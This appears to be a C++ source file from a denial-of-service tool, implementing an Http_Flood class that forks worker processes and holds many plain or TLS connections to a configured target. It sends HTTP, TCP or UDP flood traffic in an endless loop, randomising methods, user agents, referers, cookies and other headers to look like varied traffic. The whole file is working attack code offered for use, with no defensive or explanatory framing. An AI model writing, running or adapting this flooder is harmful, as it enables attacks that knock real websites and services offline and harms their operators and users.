#include <netdb.h>
#include <cstring>
#include <utility>
#include <unistd.h>
#include <openssl/ssl.h>

#include "../Headers/Http_Flood.hpp"
#include "../Headers/httphdr.hpp"


Http_Flood::Http_Flood(std::shared_ptr<Config> conf) : Attack_Vector(std::move(conf)){

}

void Http_Flood::run() {
    for (int x = 0; x < conf->THREADS; x++) {
        if(fork()){
            if(conf->UseSSL){
                attack_ssl(&x);
            }else{
                attack(&x);
            }
        }
    }
    getc(stdin);
}

int Http_Flood::make_socket(const char *host, const char *port, int sock_type) {
    struct addrinfo hints{}, *servinfo, *p;
    int sock = 0, r;
    std::string message = std::string("Connecting-> ") + host + ":" + port;
    conf->logger->Log(&message, Logger::Info);
    bzero(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = sock_type;
    if((r=getaddrinfo(host, port, &hints, &servinfo))!=0) {
        message = std::string("Getaddrinfo-> ") + gai_strerror(r);
        conf->logger->Log(&message, Logger::Error);
        exit(EXIT_FAILURE);
    }
    for(p = servinfo; p != nullptr; p = p->ai_next) {
        if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
            continue;
        }
        if(connect(sock, p->ai_addr, p->ai_addrlen) == -1) {
            close(sock);
            continue;
        }
        break;
    }
    if(p == nullptr) {
        if(servinfo){
            freeaddrinfo(servinfo);
        }
        conf->logger->Log("No connection could be made", Logger::Error);
        exit(EXIT_FAILURE);
    }
    if(servinfo){
        freeaddrinfo(servinfo);
    }
    message = std::string("Connected-> ") + host + ":" + port;
    conf->logger->Log(&message, Logger::Info);
    return sock;
}

SSL_CTX *Http_Flood::InitCTX() {
    SSL_library_init();
    const SSL_METHOD *method{GetMethod()};
    SSL_CTX *ctx;
    ctx = SSL_CTX_new(method);
    if (ctx == nullptr){
        conf->logger->Log("Unable to connect using ssl", Logger::Error);
        exit(EXIT_FAILURE);
    }
    return ctx;
}

SSL *Http_Flood::Apply_SSL(int socket, SSL_CTX *ctx) {
    SSL *ssl = SSL_new(ctx);
    SSL_set_fd(ssl, socket);
    if(SSL_connect(ssl) == -1){
        conf->logger->Log("Unable to connect using ssl", Logger::Error);
        exit(EXIT_FAILURE);
    }
    return ssl;
}

void Http_Flood::cleanup(const int *socket) {
    close(*socket);
}

void Http_Flood::cleanup(SSL *ssl, const int *socket, SSL_CTX *ctx) {
    SSL_free(ssl);
    close(*socket);
    SSL_CTX_free(ctx);
}

void Http_Flood::read_socket(int socket) {
    char chunk[128];
    while(read(socket , chunk, 128)){
        bzero(chunk, sizeof(chunk));
    }
}

void Http_Flood::read_socket(SSL *ssl) {
    char chunk[128];
    while(SSL_read(ssl , chunk, 128)){
        bzero(chunk, sizeof(chunk));
    }
}

int Http_Flood::write_socket(int socket, const char *string, int length) {
    return static_cast<int>(write(socket, string, static_cast<size_t>(length)));
}

int Http_Flood::write_socket(SSL *ssl, const char *string, int length) {
    return (SSL_write(ssl, string, length));
}

void Http_Flood::attack(const int *id) {
    int r;
    std::vector<int> sockets;
    sockets.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
    for (int x = 0; x < conf->CONNECTIONS; x++) {
        sockets.emplace_back(0);
    }
    while(true) {
        static std::string message;
        for (int x = 0; x < conf->CONNECTIONS; x++) {
            if(!sockets[x]){
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), conf->protocol);
            }
            std::string header{};
            init_header(header);
            if((r = write_socket(sockets[x], header.c_str(), header.length())) == -1){
                cleanup(&sockets[x]);
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), conf->protocol);
            }else{
                if(conf->GetResponse){
                    read_socket(sockets[x]);
                }
                message = std::string("Socket[") + std::to_string(x) + "->"
                          + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
                conf->logger->Log(&message, Logger::Info);
                message = std::to_string(*id) + ": Voly Sent";
                conf->logger->Log(&message, Logger::Info);
            }
        }
        message = std::to_string(*id) + ": Voly Sent";
        conf->logger->Log(&message, Logger::Info);
        pause();
    }
}

void Http_Flood::attack_ssl(const int *id) {
    int r;
    std::vector<int> sockets;
    std::vector<SSL_CTX *> CTXs;
    std::vector<SSL *> SSLs;
    sockets.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
    CTXs.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
    SSLs.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
    for (int x = 0; x < conf->CONNECTIONS; x++) {
        sockets.emplace_back(0);
        SSLs.emplace_back(nullptr);
        CTXs.emplace_back(nullptr);
    }
    while(true) {
        static std::string message;
        for (int x = 0; x < conf->CONNECTIONS; x++) {
            if(!sockets[x]){
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), conf->protocol);
                CTXs[x] = InitCTX();
                SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
            }
            std::string header{};
            init_header(header);
            if((r = write_socket(SSLs[x], header.c_str(), static_cast<int>(header.length()))) == -1){
                cleanup(SSLs[x], &sockets[x], CTXs[x]);
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), conf->protocol);
                CTXs[x] = InitCTX();
                SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
            }else{
                if(conf->GetResponse){
                    read_socket(SSLs[x]);
                }
                message = std::string("Socket[") + std::to_string(x) + "->"
                          + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
                conf->logger->Log(&message, Logger::Info);
                message = std::to_string(*id) + ": Voly Sent";
                conf->logger->Log(&message, Logger::Info);
            }
        }
        message = std::to_string(*id) + ": Voly Sent";
        conf->logger->Log(&message, Logger::Info);
        pause();
    }
}

const SSL_METHOD *Http_Flood::GetMethod() {
    switch (conf->protocol){
        case Config::TCP:
            return TLSv1_1_client_method();
        case Config::UDP:
#ifdef DTLS_ANY_VERSION
            return DTLSv1_2_client_method();
#else
            conf->logger->Log("Unable to find DTLS", Logger::Info);
            exit(EXIT_FAILURE);
#endif
        default:
            return nullptr;
    }
}

void Http_Flood::init_header(std::string& header) {
    switch (conf->vector){
        case Config::UDPFlood:
        case Config::TCPFlood:
            header += Randomizer::randomstr();
            break;
        case Config::HTTP:{
            auto http = std::make_unique<httphdr>();
            http->setMethod(const_cast<std::string &>(Randomizer::random_method()));
            if(conf->RandomizeHeader){
                http->setLocation(const_cast<std::string &>(Randomizer::randomstr()));
            }
            http->setUseragent(const_cast<std::string &>(Randomizer::random_useragent(*(conf->useragents))));
            http->setCacheControl(const_cast<std::string &>(Randomizer::random_caching()));
            http->setEncoding(const_cast<std::string &>(Randomizer::random_encoding()));
            http->setCharset(const_cast<std::string &>(Randomizer::random_charset()),
                             const_cast<std::string &>(Randomizer::random_charset()));
            http->setReferer(const_cast<std::string &>(Randomizer::random_referer()));
            http->setAccept((std::string &) "*/*");
            http->setConnectionType((std::string &) "Keep-Alive");
            http->setContentType(const_cast<std::string &>(Randomizer::random_contenttype()));
            http->setCookie(const_cast<std::string &>(Randomizer::randomstr()),
                            const_cast<std::string &>(Randomizer::randomstr()));
            http->setKeepAlive(Randomizer::randomInt(1, 5000));
            http->setDNT(Randomizer::randomInt(0, 1));

            header += http->get();
            break;
        }
        default:break;
    }
}

void Http_Flood::init_header(std::string& header, bool) {

}
